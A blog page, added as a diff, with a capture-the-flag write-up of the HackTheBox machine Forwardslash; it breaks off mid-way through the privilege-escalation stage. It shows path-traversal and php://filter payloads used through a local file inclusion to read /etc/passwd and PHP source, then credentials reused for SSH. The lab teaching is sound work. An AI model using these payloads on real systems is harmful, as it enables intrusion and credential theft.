@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Forwardslash | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/07/htb-forwardslash.html" title="Read more" class="entry-title-link">
+                HTB: Forwardslash</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-07-07T09:09:00+02:00">07 Jul 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/openadmin.html" title="Read more with the label openAdmin" class="meta-link">openAdmin</a> 
+          <a href="../../tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 14 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.07/forwardslash_card.png" alt="Forwardslash card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/239">Forwardslash</a> created by
+<a href="https://www.hackthebox.eu/home/users/profile/52045">InfoSecJack</a> and
+<a href="https://www.hackthebox.eu/home/users/profile/44614">chivato</a> publish on
+April 4, 2020.
+This box is classified as an hard machine. The user part inplies some
+enumeration a LFI, some PHP filter, a home made backup binary. The root part
+implies some home made crypto (<strong>don't</strong>) and a LUKS image.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sun Apr 25 07:56:08 2020 as: nmap -p- -oN nmap 10.10.10.183</span>
+<span class="code-line">Nmap scan report for 10.10.10.183</span>
+<span class="code-line">Host is up (0.014s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE</span>
+<span class="code-line">22/tcp open  ssh</span>
+<span class="code-line">80/tcp open  http</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Sun Apr 25 07:56:20 2020 -- 1 IP address (1 host up) scanned in 12.27 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>The homepage announce that the site was hacked.</p>
+<p><img alt="homepage" src="/media/2020.07/forwardslash_01.png"></p>
+<p>We don't have access to anything. We start with a simple fuzzing using <code>ffuf</code>
+but nothing interesting came out. We had the extension <code>.xml</code>, <code>.txt</code> and <code>.php</code>
+to <code>ffuf</code> and relaunch it. This time we found an "interesting" page: <code>note.txt</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://forwardslash.htb/FUZZ -mc 200 -c -e .xml,.txt,.php</span>
+<span class="code-line"></span>
+<span class="code-line">        /&#39;___\  /&#39;___\           /&#39;___\</span>
+<span class="code-line">      /\ \__/ /\ \__/  __  __  /\ \__/</span>
+<span class="code-line">      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span>
+<span class="code-line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span>
+<span class="code-line">        \ \_\   \ \_\  \ \____/  \ \_\</span>
+<span class="code-line">          \/_/    \/_/   \/___/    \/_/</span>
+<span class="code-line"></span>
+<span class="code-line">      v1.0.2</span>
+<span class="code-line">________________________________________________</span>
+<span class="code-line"></span>
+<span class="code-line">:: Method           : GET</span>
+<span class="code-line">:: URL              : http://forwardslash.htb/FUZZ</span>
+<span class="code-line">:: Extensions       : .xml .txt .php</span>
+<span class="code-line">:: Follow redirects : false</span>
+<span class="code-line">:: Calibration      : false</span>
+<span class="code-line">:: Timeout          : 10</span>
+<span class="code-line">:: Threads          : 40</span>
+<span class="code-line">:: Matcher          : Response status: 200</span>
+<span class="code-line">________________________________________________</span>
+<span class="code-line"></span>
+<span class="code-line">index.php               [Status: 200, Size: 1695, Words: 207, Lines: 42]</span>
+<span class="code-line">note.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]</span>
+<span class="code-line">:: Progress: [81876/81876] :: Job [1/1] :: 481 req/sec :: Duration: [0:02:50] :: Errors: 67 ::</span>
+<span class="code-line"></code></pre></div>
+
+<p>The note contain a message from the website administrator <code>chiv</code> speaking about
+a backup site.</p>
+<blockquote>
+<p>Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name...  Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.</p>
+<p>-chiv</p>
+</blockquote>
+<p>We modify our <code>/etc/hosts</code> in order to add the <code>backup</code> subdomain and browse to
+<code>http://backup.forwardslash.htb/</code> which is an authentication form.</p>
+<p><img alt="backup homepage" src="/media/2020.07/forwardslash_02.png"></p>
+<p>We are able to auto register here and access an few functionality. One was
+disabled because of the hack: The profile picture upload. But the button are just
+disables in the HTML source code. We can easily re-enable them with the element
+inspector (browser built-in).</p>
+<p>We can then upload our profile picture with a POST request. Nevertheless we can
+also modify the URL to include local files as <code>/etc/passwd</code> by simply putting a
+relative path.</p>
+<p>Here is the request:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /profilepicture.php HTTP/1.1</span>
+<span class="code-line">Host: backup.forwardslash.htb</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq</span>
+<span class="code-line">Content-Length: 32</span>
+<span class="code-line"></span>
+<span class="code-line">url=../../../../../../etc/passwd</span>
+<span class="code-line"></code></pre></div>
+
+<p>Here is the server's response:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&lt;SNIP&gt;</span>
+<span class="code-line">root:x:0:0:root:/root:/bin/bash</span>
+<span class="code-line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="code-line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="code-line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="code-line">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="code-line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="code-line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="code-line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="code-line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="code-line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="code-line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="code-line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="code-line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="code-line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="code-line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="code-line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
+<span class="code-line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
+<span class="code-line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="code-line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span>
+<span class="code-line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span>
+<span class="code-line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span>
+<span class="code-line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span>
+<span class="code-line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span>
+<span class="code-line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span>
+<span class="code-line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span>
+<span class="code-line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span>
+<span class="code-line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span>
+<span class="code-line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span>
+<span class="code-line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="code-line">pain:x:1000:1000:pain:/home/pain:/bin/bash</span>
+<span class="code-line">chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash</span>
+<span class="code-line">mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="code-line"></code></pre></div>
+
+<p>Now that we have a LFI we can look for the database credentials. We load the
+<code>register.php</code> file as it is certainly using the database to store the new
+users. We see that the file only include the <code>config.php</code> file.</p>
+<p>Here is the request:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /profilepicture.php HTTP/1.1</span>
+<span class="code-line">Host: backup.forwardslash.htb</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Content-Length: 18</span>
+<span class="code-line">Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq</span>
+<span class="code-line"></span>
+<span class="code-line">url=./register.php</span>
+<span class="code-line"></code></pre></div>
+
+<p>Here is the server's answer:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&lt;SNIP&gt;</span>
+<span class="code-line">// Include config file</span>
+<span class="code-line">require_once &quot;config.php&quot;;</span>
+<span class="code-line"></span>
+<span class="code-line">// Define variables and initialize with empty values</span>
+<span class="code-line">$username = $password = $confirm_password = &quot;&quot;;</span>
+<span class="code-line">$username_err = $password_err = $confirm_password_err = &quot;&quot;;</span>
+<span class="code-line"></span>
+<span class="code-line">// Processing form data when form is submitted</span>
+<span class="code-line">if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>Therefore we load the <code>config.php</code> file. It contains the current DB credentials
+but we cannot use them for anything else (mostly connect using the SSH service).
+The comment speaks about a backup of the old configuration.</p>
+<p>Here is the request:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /profilepicture.php HTTP/1.1</span>
+<span class="code-line">Host: backup.forwardslash.htb</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Content-Length: 16</span>
+<span class="code-line">Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq</span>
+<span class="code-line"></span>
+<span class="code-line">url=./config.php</span>
+<span class="code-line"></code></pre></div>
+
+<p>Here is the server's answer:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>//credentials for the temp db while we recover, had to backup old config, didn&#39;t want it getting compromised -pain</span>
+<span class="code-line">define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);</span>
+<span class="code-line">define(&#39;DB_USERNAME&#39;, &#39;www-data&#39;);</span>
+<span class="code-line">define(&#39;DB_PASSWORD&#39;, &#39;5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec&#39;);</span>
+<span class="code-line">define(&#39;DB_NAME&#39;, &#39;site&#39;);</span>
+<span class="code-line"></span>
+<span class="code-line">/* Attempt to connect to MySQL database */</span>
+<span class="code-line">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span>
+<span class="code-line"></span>
+<span class="code-line">// Check connection</span>
+<span class="code-line">if($link === false){</span>
+<span class="code-line">    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());</span>
+<span class="code-line">}</span>
+<span class="code-line"></code></pre></div>
+
+<p>We start enumeration the website and quickly found the <code>/dev/</code> folder. He is not
+accessible from our IP address as there must be some network filtering.</p>
+<p><img alt="dev access denied" src="/media/2020.07/forwardslash_03.png"></p>
+<p>We try to include the file with our previous LFI but we got an error saying "Permission Denied; not that way ;)"</p>
+<p>Here is the request:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /profilepicture.php HTTP/1.1</span>
+<span class="code-line">Host: backup.forwardslash.htb</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Content-Length: 17</span>
+<span class="code-line">Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq</span>
+<span class="code-line"></span>
+<span class="code-line">url=dev/index.php</span>
+<span class="code-line"></code></pre></div>
+
+<p>We then try to use the PHP filters to access the file content. The base64 filter
+give us the content of the file base64 encoded.</p>
+<p>Here is the request:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /profilepicture.php HTTP/1.1</span>
+<span class="code-line">Host: backup.forwardslash.htb</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Content-Length: 61</span>
+<span class="code-line">Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq</span>
+<span class="code-line"></span>
+<span class="code-line">url=php://filter/convert.base64-encode/resource=dev/index.php</span>
+<span class="code-line"></code></pre></div>
+
+<p>Here is the server's answer:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K</span>
+<span class="code-line"></code></pre></div>
+
+<p>We decode the base64 content to get the old database credentials.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="x">if (preg_match($reg, $_GET[&#39;xml&#39;], $match)) {</span></span>
+<span class="code-line"><span class="x">        $ip = explode(&#39;/&#39;, $match[0])[2];</span></span>
+<span class="code-line"><span class="x">        echo $ip;</span></span>
+<span class="code-line"><span class="x">        error_log(&quot;Connecting&quot;);</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="x">        $conn_id = ftp_connect($ip) or die(&quot;Couldn&#39;t connect to $ip\n&quot;);</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="x">        error_log(&quot;Logging in&quot;);</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="x">        if (@ftp_login($conn_id, &quot;chiv&quot;, &#39;N0bodyL1kesBack/&#39;)) {</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="x">                error_log(&quot;Getting file&quot;);</span></span>
+<span class="code-line"><span class="x">                echo ftp_get_string($conn_id, &quot;debug.txt&quot;);</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>This credentials are also valid for the SSH service as <code>chiv</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ ssh chiv@forwardslash.htb</span>
+<span class="code-line">chiv@forwardslash.htb&#39;s password:</span>
+<span class="code-line">&lt;snip&gt;</span>
+<span class="code-line">chiv@forwardslash:~$</span>
+<span class="code-line"></code></pre></div>
+
+<p>There is no user.txt in <code>chiv</code>'s home folder. The other user is <code>pain</code> with the
+<code>uid</code> 1000. We start enumerating the box for a privilege escalation.</p>
+<p>We can list the file in the <code>pain</code> user homefolder. The <code>encryptorinator</code> and
+<code>note.txt</code> are even readable by they are for the root part, so we will come back
+to them later.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:~$ ls ../pain/</span>
+<span class="code-line">encryptorinator  note.txt  user.txt</span>
+<span class="code-line"></code></pre></div>
+
+<p>When looking at <code>/var/backups/</code> we see a few interesting files, mainly the
+<code>config.php.bak</code> that is only readable by the <code>pain</code> user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:~$ ls /var/backups/ -l</span>
+<span class="code-line">total 996</span>
+<span class="code-line">-rw-r--r-- 1 root root            61440 Mar 24 06:25 alternatives.tar.0</span>
+<span class="code-line">-rw-r--r-- 1 root root            38908 Mar 24 06:17 apt.extended_states.0</span>
+<span class="code-line">-rw-r--r-- 1 root root             4115 Mar  6 14:17 apt.extended_states.1.gz</span>
+<span class="code-line">-rw-r--r-- 1 root root             3909 Mar  5 14:46 apt.extended_states.2.gz</span>
+<span class="code-line">-rw------- 1 pain pain              526 Jun 21  2019 config.php.bak</span>
+<span class="code-line">-rw-r--r-- 1 root root              437 Mar  5 14:07 dpkg.diversions.0</span>
+<span class="code-line">-rw-r--r-- 1 root root              202 Mar  5 14:07 dpkg.diversions.1.gz</span>
+<span class="code-line">-rw-r--r-- 1 root root              207 Mar  5 14:47 dpkg.statoverride.0</span>
+<span class="code-line">-rw-r--r-- 1 root root              171 Mar  5 14:47 dpkg.statoverride.1.gz</span>
+<span class="code-line">-rw-r--r-- 1 root root           668374 Mar 24 06:17 dpkg.status.0</span>
+<span class="code-line">-rw-r--r-- 1 root root           188241 Mar 24 06:17 dpkg.status.1.gz</span>
+<span class="code-line">-rw------- 1 root root              730 Mar 17 20:13 group.bak</span>
+<span class="code-line">-rw------- 1 root shadow            604 Mar 17 20:13 gshadow.bak</span>
+<span class="code-line">-r--r--r-- 1 root root              129 May 27  2019 note.txt</span>
+<span class="code-line">-rw------- 1 root root             1660 Mar  5 14:46 passwd.bak</span>
+<span class="code-line">drwxrwx--- 2 root backupoperator   4096 May 27  2019 recovery</span>
+<span class="code-line">-rw------- 1 root shadow           1174 Mar  6 14:21 shadow.bak</span>
+<span class="code-line"></code></pre></div>
+
+<p>When looking for SUID binary we found that the binary <code>/usr/bin/backup</code> is SUID
+and belonging to the <code>pain</code> user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:/home/pain$ find / -uid 1000 -perm -4000 -type f 2&gt;/dev/null</span>
+<span class="code-line">/usr/bin/backup</span>
+<span class="code-line"></code></pre></div>
+
+<p>The binary is a standard linux program. When we run it, it told us that a file
+doesn't exist. The filename looks like a MD5 hash.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:/home/pain$ file /usr/bin/backup</span>
+<span class="code-line">/usr/bin/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e0fcfb1c48fe0b5377774c1d237dc50ddfa41c08, not stripped</span>
+<span class="code-line">chiv@forwardslash:/home/pain$ /usr/bin/backup</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line">        Pain&#39;s Next-Gen Time Based Backup Viewer</span>
+<span class="code-line">        v0.1</span>
+<span class="code-line">        NOTE: not reading the right file yet,</span>
+<span class="code-line">        only works if backup is taken in same second</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Current Time: 10:14:45</span>
+<span class="code-line">ERROR: f057d631c54aae27e968bc3fafb02b4e Does Not Exist or Is Not Accessible By Me, Exiting...</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use <code>ltrace</code> to see what are the system call of the program and we see that
+the filename is a MD5 hash of the current time.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:/home/pain$ ltrace /usr/bin/backup</span>
+<span class="code-line">getuid()                                                                                                                                         = 1001</span>
+<span class="code-line">getgid()                                                                                                                                         = 1001</span>
+<span class="code-line">puts(&quot;--------------------------------&quot;...----------------------------------------------------------------------</span>
+<span class="code-line">        Pain&#39;s Next-Gen Time Based Backup Viewer</span>
+<span class="code-line">        v0.1</span>
+<span class="code-line">        NOTE: not reading the right file yet,</span>
+<span class="code-line">        only works if backup is taken in same second</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line"></span>
+<span class="code-line">)                                                                                                      = 277</span>
+<span class="code-line">time(0)                                                                                                                                          = 1588846490</span>
+<span class="code-line">localtime(0x7ffdb8c71790)                                                                                                                        = 0x7f373a3526a0</span>
+<span class="code-line">malloc(13)                                                                                                                                       = 0x56277209e8e0</span>
+<span class="code-line">sprintf(&quot;10:14:50&quot;, &quot;%02d:%02d:%02d&quot;, 10, 14, 50)                                                                                                = 8</span>
+<span class="code-line">strlen(&quot;10:14:50&quot;)                                                                                                                               = 8</span>
+<span class="code-line">malloc(33)                                                                                                                                       = 0x56277209e900</span>
+<span class="code-line">MD5_Init(0x7ffdb8c716e0, 4000, 0x56277209e900, 0x56277209e900)                                                                                   = 1</span>
+<span class="code-line">MD5_Update(0x7ffdb8c716e0, 0x56277209e8e0, 8, 0x56277209e8e0)                                                                                    = 1</span>
+<span class="code-line">MD5_Final(0x7ffdb8c71740, 0x7ffdb8c716e0, 0x7ffdb8c716e0, 0)                                                                                     = 1</span>
+<span class="code-line">snprintf(&quot;9c&quot;, 32, &quot;%02x&quot;, 0x9c)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;71&quot;, 32, &quot;%02x&quot;, 0x71)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;36&quot;, 32, &quot;%02x&quot;, 0x36)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;55&quot;, 32, &quot;%02x&quot;, 0x55)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;35&quot;, 32, &quot;%02x&quot;, 0x35)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;e4&quot;, 32, &quot;%02x&quot;, 0xe4)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;4d&quot;, 32, &quot;%02x&quot;, 0x4d)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;c7&quot;, 32, &quot;%02x&quot;, 0xc7)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;6d&quot;, 32, &quot;%02x&quot;, 0x6d)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;65&quot;, 32, &quot;%02x&quot;, 0x65)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;bb&quot;, 32, &quot;%02x&quot;, 0xbb)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;cd&quot;, 32, &quot;%02x&quot;, 0xcd)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;1f&quot;, 32, &quot;%02x&quot;, 0x1f)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;aa&quot;, 32, &quot;%02x&quot;, 0xaa)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;ab&quot;, 32, &quot;%02x&quot;, 0xab)                                                                                                                 = 2</span>
+<span class="code-line">snprintf(&quot;14&quot;, 32, &quot;%02x&quot;, 0x14)                                                                                                                 = 2</span>
+<span class="code-line">printf(&quot;Current Time: %s\n&quot;, &quot;10:14:50&quot;Current Time: 10:14:50</span>
+<span class="code-line">)                                                                                                         = 23</span>
+<span class="code-line">setuid(1002)                                                                                                                                     = -1</span>
+<span class="code-line">setgid(1002)                                                                                                                                     = -1</span>
+<span class="code-line">access(&quot;9c71365535e44dc76d65bbcd1faaab14&quot;..., 0)                                                                                                 = -1</span>
